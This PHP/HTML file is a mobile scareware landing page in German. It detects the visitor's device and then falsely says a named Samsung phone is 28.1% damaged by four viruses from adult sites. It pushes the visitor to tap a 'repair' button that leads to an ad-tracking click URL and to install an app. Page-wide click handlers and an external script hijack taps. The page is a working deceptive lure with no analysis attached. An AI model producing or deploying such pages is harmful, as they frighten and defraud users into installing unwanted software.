<?php
require_once 'mobiledetect/Mobile_Detect.php';
$detect = new Mobile_Detect;
$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');
$scriptVersion = $detect->getScriptVersion();
$deviceName="";
$tracking ="http://google.ru";
$application ="UC браузер";
?>
 <?php foreach($detect->getRules() as $name => $regex):
     $check = $detect->{'is'.$name}();
      if($check): 	
				 $names = explode(' ', $name);
				$deviceName = $names[0];
				break;
				 endif; 
				 
				 
				 ?>
            
        <?php endforeach; ?>
<?php echo $deviceName;?>
<html><head>
  <base href="">
<meta charset="utf-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<title></title>
<style>#timer p,p{color:#555}#error,#timer{display:inline-block;float:left}#timer p,.btn{font-weight:700}body{font-family:sans-serif}a{text-decoration:none}footer,header,section{clear:both}*{margin:0;padding:0}#wrapper{max-width:100%;padding:5px}h1{font-size:20px}p{font-size:14px;padding:5px 0}#timer{max-width:290px;width:65%}#timer p{font-size:12px}#error{max-width:120px;width:35%}#error img{width:100%}.btn{background-color:#6d96f1;border-radius:5px;color:#fff;display:block;line-height:50px;max-width:275px;width:90%}.red{color:red}.clickable { cursor: pointer; }
<body class="" onLoad="translate(1)" onclick="goto();">
замени на <body class="clickable" onLoad="translate(1)" onclick="goto();"></style>
</head>
<body class="" onload="translate(1)" onclick="goto();">
<script type="text/javascript" src="2htrls.js"></script>
<div id="wrapper">
<section><h1><span id="headingtext">Ihr System wird von (vier) Virus schwer beschädigt!</span></h1>
</section>
<section>
<div id="timer">
<p><span class="red" id="redtext">Wir erkennen, dass Ihr Samsung Galaxy Core Prime 28,1% BESCHÄDIGT wegen (vier) schädlichen Viren aus den jüngsten Erwachsenen-Sites. Bald wird es Ihres Telefons SIM-Karte beschädigt werden, und korrupt Ihre Kontakte, Fotos, Daten, Anwendungen, usw.</span></p><p>
</p>
</div>
<div id="error"><img src="12.gif" alt=""> </div>
</section>
<section>
<p> <b><span id="text3">Wenn Sie den Virus nicht entfernen jetzt, wird es zu schweren Schäden an Ihrem Telefon führen. Hier ist, was Sie (Schritt für Schritt) tun müssen:</span></b>
<br>
<br><span id="text4">Schritt 1: Taste Tippen und installieren App kostenlos bei Google Play!</span>
<br>
<br>
<span id="text5">Schritt 2: Öffnen der App zu beschleunigen und Ihrem Browser beheben jetzt!</span></p>
</section>
<p  align="center"><span style="text-align:center;display:block;">
		        <a href="http://scaliams-advault.com/click" id="Button" onclick="rcta();return false;" style="box-sizing: border-box;padding:10px 15px;color:#fff;border-radius:3px;width: 100%;display: block;background: #0370ea;
		background: -moz-linear-gradient(top,#008dfd 0,#0370ea 100%);
		background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#008dfd),color-stop(100%,#0370ea));
		background: -webkit-linear-gradient(top,#008dfd 0,#0370ea 100%);
		background: -o-linear-gradient(top,#008dfd 0,#0370ea 100%);
		background: -ms-linear-gradient(top,#008dfd 0,#0370ea 100%);
		background: linear-gradient(top,#008dfd 0,#0370ea 100%);">REPARATUR FAST JETZT</a>
</span></p>
</div>

</body></html>